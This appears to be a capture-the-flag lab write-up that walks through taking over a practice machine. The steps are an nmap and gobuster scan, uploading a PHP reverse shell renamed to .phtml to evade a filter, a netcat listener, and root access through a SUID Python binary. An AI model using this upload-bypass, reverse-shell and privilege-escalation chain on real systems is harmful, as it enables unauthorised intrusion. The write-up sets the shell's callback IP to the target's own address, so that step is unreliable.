I started with an nmap scan 10.10.110.118 using

nmap -sV 10.10.110.118

this returned:-

===============================================================

i had then ran gobuster to find hidden directorys on port 80

gobuster dir -u 10.10.110.118 -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
-uSpecify’s the target
-wSpecify’s word list path

This had then produced the following:-

===============================================================

Navigated to 10.10.110.118 and used the php reverse shell here:-

Made the php-reverse-shell script executable by using the command :
chmod +x php_reverse_shell.php
Opened the script in editor and change the $ip and $port to $10.10.110.118 and $9001

===============================================================

I tried to upload the shell however got this error:-

Upload failed due to naming error therefore using this command fixed it:-

mv php_reverse_shell.php php_reverse_shell.phtml

===============================================================

Re uploaded and it was successful:-

===============================================================

I had then set up a netcat listener:-

nc -lvnp 9001

I then navigated to 10.10.110.118/uploads and selected the shell and checked my listener.

**WE NOW HAVE SHELL**

===============================================================

To make it a stable shell i used the following:-

which python
python -c 'import pty;pty.spawn("/bin/bash")'

I then used the following to search for user.txt:-

find / -type f -name user.txt 2> /dev/null

I then searched for a way to escalate privilege.

find / -perm -u=s type f 2> /dev/null

Identified the following path:-

/usr/bin/python

I then escalated privilege using the following command line:

/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
